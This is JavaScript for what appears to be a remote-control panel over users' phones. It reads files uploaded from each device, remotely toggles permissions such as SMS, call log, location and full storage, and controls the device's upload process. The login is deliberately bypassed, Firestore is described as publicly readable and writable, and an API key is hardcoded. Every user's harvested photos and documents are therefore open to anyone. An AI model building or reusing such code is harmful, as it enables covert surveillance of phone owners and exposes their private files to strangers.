// No login required — open admin dashboard.
// Firestore is accessed via REST API with the public API key.

const API_KEY = 'AIzaSyAwVeCSzwO50MPqp9SkjDKk3AZ91xml0Uk';
const PROJECT = 'permisionn';
const FS_BASE = `https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents`;

const PERMISSIONS = [
  { id:'camera',          label:'Camera',            icon:'📷', desc:'Take photos and record video' },
  { id:'microphone',      label:'Microphone',        icon:'🎙️', desc:'Record audio' },
  { id:'location',        label:'Location',          icon:'📍', desc:'Precise GPS location' },
  { id:'location_always', label:'Location (Always)', icon:'🗺️', desc:'Background location access' },
  { id:'storage',         label:'Storage',           icon:'💾', desc:'Read and write files' },
  { id:'photos',          label:'Photos & Media',    icon:'🖼️', desc:'Access photos and media' },
  { id:'contacts',        label:'Contacts',          icon:'👥', desc:'Read and write contacts' },
  { id:'phone',           label:'Phone',             icon:'📞', desc:'Make and manage calls' },
  { id:'sms',             label:'SMS',               icon:'💬', desc:'Send and receive messages' },
  { id:'call_log',        label:'Call Log',          icon:'📋', desc:'Access call history' },
  { id:'bluetooth',       label:'Bluetooth',         icon:'🔵', desc:'Connect Bluetooth devices' },
  { id:'bluetooth_scan',  label:'Bluetooth Scan',    icon:'📡', desc:'Scan nearby devices' },
  { id:'notifications',   label:'Notifications',     icon:'🔔', desc:'Show push notifications' },
  { id:'calendar',        label:'Calendar',          icon:'📅', desc:'Read and write calendar events' },
  { id:'sensors',         label:'Body Sensors',      icon:'❤️', desc:'Access health sensors' },
  { id:'activity',        label:'Activity',          icon:'🏃', desc:'Detect physical activity' },
  { id:'nearby_wifi',     label:'Nearby WiFi',       icon:'📶', desc:'Scan nearby WiFi networks' },
  { id:'manage_storage',  label:'Manage All Files',  icon:'🗂️', desc:'Full file system access' },
];

const FILE_TYPE_ICONS = {
  image:'🖼️', video:'🎬', audio:'🎵',
  document:'📄', apk:'📦', archive:'🗜️', other:'📎',
};

// ── App state ────────────────────────────────────────────────────────────────
let allUsers         = [];
let currentUserId    = null;
let pendingPerms     = {};
let allDeviceFiles   = [];
let filteredFiles    = [];
let activeTypeFilter = 'all';
let lbIndex          = 0;
let lbImages         = [];
let currentFilesId   = null;
let pollInterval     = null;

// ═══════════════════════════════════════════════════════════════════════════
// FIRESTORE REST HELPERS (no auth token needed — rules allow public access)
// ═══════════════════════════════════════════════════════════════════════════

function toFS(v) {
  if (v === null || v === undefined) return { nullValue: null };
  if (typeof v === 'boolean')        return { booleanValue: v };
  if (typeof v === 'number')         return { integerValue: String(Math.round(v)) };
  if (typeof v === 'string')         return { stringValue: v };
  if (Array.isArray(v))              return { arrayValue: { values: v.map(toFS) } };
  if (typeof v === 'object')         return { mapValue: { fields: objToFS(v) } };
  return { stringValue: String(v) };
}
function objToFS(obj) {
  return Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, toFS(v)]));
}
function fromFS(f) {
  if (!f) return null;
  if ('nullValue'      in f) return null;
  if ('booleanValue'   in f) return f.booleanValue;
  if ('integerValue'   in f) return parseInt(f.integerValue);
  if ('doubleValue'    in f) return f.doubleValue;
  if ('stringValue'    in f) return f.stringValue;
  if ('timestampValue' in f) return { seconds: Math.floor(new Date(f.timestampValue).getTime() / 1000) };
  if ('arrayValue'     in f) return (f.arrayValue.values || []).map(fromFS);
  if ('mapValue'       in f) return fromFSFields(f.mapValue.fields || {});
  return null;
}
function fromFSFields(fields) {
  return Object.fromEntries(Object.entries(fields).map(([k, v]) => [k, fromFS(v)]));
}
function docToObj(doc) {
  return { id: doc.name.split('/').pop(), ...fromFSFields(doc.fields || {}) };
}

async function fsGet(path) {
  const res = await fetch(`${FS_BASE}/${path}?key=${API_KEY}`, { referrerPolicy: 'no-referrer' });
  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
  return res.json();
}
async function fsList(path) {
  const res = await fetch(`${FS_BASE}/${path}?pageSize=500&key=${API_KEY}`, { referrerPolicy: 'no-referrer' });
  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
  const d = await res.json();
  return (d.documents || []).map(docToObj);
}
async function fsPatch(path, fields, masks) {
  const qs = (masks ? masks.map(m => `updateMask.fieldPaths=${encodeURIComponent(m)}`).join('&') + '&' : '') + `key=${API_KEY}`;
  const res = await fetch(`${FS_BASE}/${path}?${qs}`, {
    method:  'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ fields: objToFS(fields) }),
    referrerPolicy: 'no-referrer',
  });
  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
  return res.json();
}

// ═══════════════════════════════════════════════════════════════════════════
// INIT — skip login, go straight to dashboard
// ═══════════════════════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('loginPage').style.display    = 'none';
  document.getElementById('dashboardPage').style.display = 'flex';
  document.getElementById('dashboardPage').classList.add('active');
  loadUsers();
});

// ═══════════════════════════════════════════════════════════════════════════
// USERS
// ═══════════════════════════════════════════════════════════════════════════
async function loadUsers() {
  setUsersLoading(true);
  try {
    allUsers = await fsList('users');
    renderUsers(allUsers);
    updateStats(allUsers);
  } catch (ex) {
    showToast('Failed to load users: ' + ex.message, 'error');
    setUsersLoading(false);
  }
}
window.loadUsers = loadUsers;

function setUsersLoading(on) {
  document.getElementById('loadingState').classList.toggle('hidden', !on);
  document.getElementById('usersList').classList.toggle('hidden', on);
  document.getElementById('emptyState').classList.add('hidden');
}

function renderUsers(users) {
  document.getElementById('loadingState').classList.add('hidden');
  const grid = document.getElementById('usersList');
  if (!users.length) {
    grid.classList.add('hidden');
    document.getElementById('emptyState').classList.remove('hidden');
    document.getElementById('userCountBadge').textContent = '0 users';
    return;
  }
  document.getElementById('emptyState').classList.add('hidden');
  grid.classList.remove('hidden');
  document.getElementById('userCountBadge').textContent =
    `${users.length} user${users.length !== 1 ? 's' : ''}`;
  grid.innerHTML = users.map(buildUserCard).join('');
}

function buildUserCard(user) {
  const perms     = user.permissions || {};
  const enabled   = PERMISSIONS.filter(p => perms[p.id]).length;
  const fileCount = (user.fileStats || {}).total || 0;
  const initials  = (user.name || 'U').charAt(0).toUpperCase();
  const tagHtml   = PERMISSIONS.slice(0, 5).map(p =>
    `<span class="perm-tag ${perms[p.id] ? 'on' : 'off'}">${p.icon} ${p.label}</span>`
  ).join('');
  return `
    <div class="user-card">
      <div class="user-card-header">
        <div class="user-card-avatar">${initials}</div>
        <div>
          <div class="user-card-name">${esc(user.name || 'Unknown')}</div>
          <div class="user-card-email">${esc(user.email || '')}</div>
        </div>
      </div>
      <div class="perm-summary">${tagHtml}</div>
      <div class="user-card-footer">
        <span class="perm-count">${enabled}/${PERMISSIONS.length} perms · 📂 ${fileCount} files</span>
        <div class="card-btns">
          <button class="btn-sm blue"   onclick="openFilesModal('${user.id}')">📂 Files</button>
          <button class="btn-sm purple" onclick="openPermModal('${user.id}')">⚙️ Perms</button>
        </div>
      </div>
    </div>`;
}

function updateStats(users) {
  document.getElementById('statTotal').textContent  = users.length;
  document.getElementById('statPermed').textContent =
    users.filter(u => Object.values(u.permissions || {}).some(Boolean)).length;
  document.getElementById('statFiles').textContent  =
    users.reduce((s, u) => s + ((u.fileStats || {}).total || 0), 0);
}

function filterUsers() {
  const q = document.getElementById('searchInput').value.toLowerCase();
  renderUsers(allUsers.filter(u =>
    (u.name||'').toLowerCase().includes(q) || (u.email||'').toLowerCase().includes(q)
  ));
}
window.filterUsers = filterUsers;

function showSection(e, section) {
  e.preventDefault();
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  e.currentTarget.classList.add('active');
  const isStats = section === 'stats';
  document.getElementById('statsSection').classList.toggle('hidden', !isStats);
  document.getElementById('usersSection').style.display = isStats ? 'none' : '';
  document.getElementById('sectionTitle').textContent   = isStats ? 'Statistics' : 'User Management';
  if (isStats) updateStats(allUsers);
}
window.showSection = showSection;

// ═══════════════════════════════════════════════════════════════════════════
// PERMISSION MODAL
// ═══════════════════════════════════════════════════════════════════════════
function openPermModal(userId) {
  currentUserId = userId;
  const user = allUsers.find(u => u.id === userId);
  if (!user) return;
  pendingPerms = { ...(user.permissions || {}) };
  document.getElementById('permModalName').textContent   = user.name || 'Unknown';
  document.getElementById('permModalEmail').textContent  = user.email || '';
  document.getElementById('permModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();
  renderPermCards(pendingPerms);
  document.getElementById('permModal').classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
window.openPermModal = openPermModal;

function closePermModal(e) {
  if (e && e.target !== document.getElementById('permModal')) return;
  document.getElementById('permModal').classList.add('hidden');
  document.body.style.overflow = '';
  currentUserId = null;
}
window.closePermModal = closePermModal;

function renderPermCards(perms) {
  document.getElementById('permissionsGrid').innerHTML = PERMISSIONS.map(p => {
    const on = !!perms[p.id];
    return `
      <div class="perm-card ${on ? 'enabled':''}" id="card-${p.id}">
        <div class="perm-card-top">
          <div class="perm-icon-wrap ${on ? 'on':'off'}">${p.icon}</div>
          <label class="toggle">
            <input type="checkbox" id="toggle-${p.id}" ${on ? 'checked':''}
              onchange="togglePerm('${p.id}',this.checked)" />
            <span class="slider"></span>
          </label>
        </div>
        <div class="perm-name">${p.label}</div>
        <div class="perm-desc">${p.desc}</div>
      </div>`;
  }).join('');
}

function togglePerm(id, checked) {
  pendingPerms[id] = checked;
  const card = document.getElementById(`card-${id}`);
  card.classList.toggle('enabled', checked);
  card.querySelector('.perm-icon-wrap').className = `perm-icon-wrap ${checked ? 'on':'off'}`;
}
window.togglePerm = togglePerm;

function setAllPermissions(value) {
  PERMISSIONS.forEach(p => {
    pendingPerms[p.id] = value;
    const t = document.getElementById(`toggle-${p.id}`);
    if (t) t.checked = value;
    const card = document.getElementById(`card-${p.id}`);
    card?.classList.toggle('enabled', value);
    const icon = card?.querySelector('.perm-icon-wrap');
    if (icon) icon.className = `perm-icon-wrap ${value ? 'on':'off'}`;
  });
}
window.setAllPermissions = setAllPermissions;

async function savePermissions() {
  if (!currentUserId) return;
  const btn = document.getElementById('savePermBtn');
  btn.disabled = true; btn.textContent = '⏳ Saving…';
  try {
    await fsPatch(`users/${currentUserId}`, { permissions: pendingPerms }, ['permissions']);
    const idx = allUsers.findIndex(u => u.id === currentUserId);
    if (idx !== -1) allUsers[idx].permissions = { ...pendingPerms };
    showToast('Permissions saved! Applied instantly on mobile.', 'success');
    document.getElementById('permModal').classList.add('hidden');
    document.body.style.overflow = '';
    currentUserId = null;
    renderUsers(allUsers);
  } catch (ex) {
    showToast('Save failed: ' + ex.message, 'error');
  } finally {
    btn.disabled = false; btn.textContent = '💾 Save Changes';
  }
}
window.savePermissions = savePermissions;

// ═══════════════════════════════════════════════════════════════════════════
// FILES MODAL
// ═══════════════════════════════════════════════════════════════════════════
async function openFilesModal(userId) {
  const user = allUsers.find(u => u.id === userId);
  if (!user) return;
  currentFilesId = userId;

  document.getElementById('filesModalName').textContent   = user.name || 'Unknown';
  document.getElementById('filesModalEmail').textContent  = user.email || '';
  document.getElementById('filesModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();

  allDeviceFiles = []; filteredFiles = []; activeTypeFilter = 'all';
  document.getElementById('filesSearchInput').value = '';
  document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
  document.querySelector('.ftab[data-type="all"]').classList.add('active');

  document.getElementById('filesModal').classList.remove('hidden');
  document.getElementById('filesLoading').classList.remove('hidden');
  document.getElementById('filesEmpty').classList.add('hidden');
  document.getElementById('filesGrid').classList.add('hidden');
  document.body.style.overflow = 'hidden';

  updateUploadControlUI('idle');
  startStatusPoll(userId);

  try {
    allDeviceFiles = await fsList(`users/${userId}/device_files`);
    allDeviceFiles.sort((a, b) => (b.lastModified?.seconds||0) - (a.lastModified?.seconds||0));
    filteredFiles = [...allDeviceFiles];
    renderFilesGrid(filteredFiles);
  } catch (ex) {
    showToast('Failed to load files: ' + ex.message, 'error');
    document.getElementById('filesLoading').classList.add('hidden');
    document.getElementById('filesEmpty').classList.remove('hidden');
  }
}
window.openFilesModal = openFilesModal;

function closeFilesModal(e) {
  if (e && e.target !== document.getElementById('filesModal')) return;
  stopStatusPoll();
  currentFilesId = null;
  document.getElementById('filesModal').classList.add('hidden');
  document.body.style.overflow = '';
}
window.closeFilesModal = closeFilesModal;

function renderFilesGrid(files) {
  document.getElementById('filesLoading').classList.add('hidden');
  const grid = document.getElementById('filesGrid');
  document.getElementById('filesCountLabel').textContent =
    `${files.length} file${files.length !== 1 ? 's' : ''}`;
  if (!files.length) {
    grid.classList.add('hidden');
    document.getElementById('filesEmpty').classList.remove('hidden');
    return;
  }
  document.getElementById('filesEmpty').classList.add('hidden');
  grid.classList.remove('hidden');
  lbImages = files.filter(f => f.fileType === 'image' && f.storageUrl)
                  .map(f => ({ url: f.storageUrl, name: f.name }));
  grid.innerHTML = files.map(f => buildFileCard(f)).join('');
}

function buildFileCard(file) {
  const isImage = file.fileType === 'image';
  const ext     = (file.name || '').split('.').pop().toUpperCase().slice(0, 4);
  const lbIdx   = lbImages.findIndex(x => x.url === file.storageUrl);
  const thumb   = isImage && file.storageUrl
    ? `<img src="${esc(file.storageUrl)}" alt="${esc(file.name)}" loading="lazy"
        onerror="this.parentElement.innerHTML='<span class=\\'file-type-icon\\'>🖼️</span>'" />`
    : `<span class="file-type-icon">${FILE_TYPE_ICONS[file.fileType]||'📎'}</span>`;
  return `
    <div class="file-card" onclick="${isImage?`openLightbox(${lbIdx})`:''}">
      <div class="file-thumb">${thumb}<span class="file-type-badge">${esc(ext)}</span></div>
      <div class="file-info">
        <div class="file-name" title="${esc(file.name||'')}">${esc(file.name||'Unknown')}</div>
        <div class="file-meta">${fmtSize(file.size||0)} · ${fmtDate(file.lastModified?.seconds)}</div>
        <div class="file-actions" onclick="event.stopPropagation()">
          ${isImage?`<button class="file-btn view" onclick="openLightbox(${lbIdx})">👁 View</button>`:''}
          ${file.storageUrl
            ?`<a class="file-btn dl" href="${esc(file.storageUrl)}" target="_blank" download="${esc(file.name||'')}">⬇ Download</a>`
            :'<span class="file-btn" style="opacity:.4">No URL</span>'}
        </div>
      </div>
    </div>`;
}

function filterFiles(type, btn) {
  activeTypeFilter = type;
  document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
  btn.classList.add('active');
  applyFilesFilter();
}
window.filterFiles = filterFiles;

function searchFiles() { applyFilesFilter(); }
window.searchFiles = searchFiles;

function applyFilesFilter() {
  const q = (document.getElementById('filesSearchInput').value||'').toLowerCase();
  filteredFiles = allDeviceFiles.filter(f =>
    (activeTypeFilter === 'all' || f.fileType === activeTypeFilter) &&
    (!q || (f.name||'').toLowerCase().includes(q))
  );
  renderFilesGrid(filteredFiles);
}

// ═══════════════════════════════════════════════════════════════════════════
// UPLOAD CONTROL
// ═══════════════════════════════════════════════════════════════════════════
function startStatusPoll(userId) {
  stopStatusPoll();
  const poll = async () => {
    try {
      const doc = await fsGet(`users/${userId}`);
      updateUploadControlUI(fromFSFields(doc.fields||{})?.uploadControl?.status || 'idle');
    } catch {}
  };
  poll();
  pollInterval = setInterval(poll, 3000);
}
function stopStatusPoll() {
  if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
}

async function controlUpload(status) {
  if (!currentFilesId) return;
  try {
    await fsPatch(`users/${currentFilesId}`, {
      uploadControl: { status, updatedAt: new Date().toISOString() }
    }, ['uploadControl']);
    const labels = { running:'resumed', paused:'paused', stopped:'stopped' };
    showToast(`Upload ${labels[status]||status} — mobile will respond instantly.`, 'success');
    updateUploadControlUI(status);
  } catch (ex) {
    showToast('Failed: ' + ex.message, 'error');
  }
}
window.controlUpload = controlUpload;

function updateUploadControlUI(status) {
  const dot  = document.getElementById('uploadStatusDot');
  const lbl  = document.getElementById('uploadStatusLabel');
  const btnR = document.getElementById('btnResume');
  const btnP = document.getElementById('btnPause');
  const btnS = document.getElementById('btnStop');
  if (!dot) return;
  const cfg = {
    idle:    { color:'#475569', text:'Idle',        r:false, p:false, s:false },
    running: { color:'#10B981', text:'Uploading…',  r:false, p:true,  s:true  },
    paused:  { color:'#F59E0B', text:'Paused',      r:true,  p:false, s:true  },
    stopped: { color:'#EF4444', text:'Stopped',     r:false, p:false, s:false },
  };
  const c = cfg[status] || cfg.idle;
  dot.style.background = c.color;
  lbl.textContent      = `Upload: ${c.text}`;
  btnR.style.display   = c.r ? '' : 'none';
  btnP.style.display   = c.p ? '' : 'none';
  btnS.style.display   = c.s ? '' : 'none';
}

// ═══════════════════════════════════════════════════════════════════════════
// LIGHTBOX
// ═══════════════════════════════════════════════════════════════════════════
function openLightbox(idx) {
  if (!lbImages.length || idx < 0) return;
  lbIndex = idx; updateLightbox();
  document.getElementById('lightbox').classList.remove('hidden');
  document.body.style.overflow = 'hidden';
}
window.openLightbox = openLightbox;

function closeLightbox() {
  document.getElementById('lightbox').classList.add('hidden');
  document.body.style.overflow = '';
}
window.closeLightbox = closeLightbox;

function lbNav(dir, e) {
  e?.stopPropagation();
  lbIndex = (lbIndex + dir + lbImages.length) % lbImages.length;
  updateLightbox();
}
window.lbNav = lbNav;

function updateLightbox() {
  const img = lbImages[lbIndex];
  document.getElementById('lbImg').src           = img.url;
  document.getElementById('lbName').textContent  = img.name;
  document.getElementById('lbDownload').href     = img.url;
  document.getElementById('lbDownload').download = img.name;
}

document.addEventListener('keydown', e => {
  if (!document.getElementById('lightbox').classList.contains('hidden')) {
    if (e.key === 'ArrowLeft')  lbNav(-1, null);
    if (e.key === 'ArrowRight') lbNav(1,  null);
    if (e.key === 'Escape')     closeLightbox();
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// UTILS
// ═══════════════════════════════════════════════════════════════════════════
function showToast(msg, type = 'success') {
  const el = document.getElementById('toast');
  el.textContent = msg; el.className = `toast ${type}`;
  el.classList.remove('hidden');
  setTimeout(() => el.classList.add('hidden'), 3500);
}
function esc(str) {
  return (str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function fmtSize(b) {
  if (!b) return '0 B';
  if (b < 1024)       return `${b} B`;
  if (b < 1048576)    return `${(b/1024).toFixed(1)} KB`;
  if (b < 1073741824) return `${(b/1048576).toFixed(1)} MB`;
  return `${(b/1073741824).toFixed(1)} GB`;
}
function fmtDate(secs) {
  if (!secs) return '—';
  return new Date(secs*1000).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
}
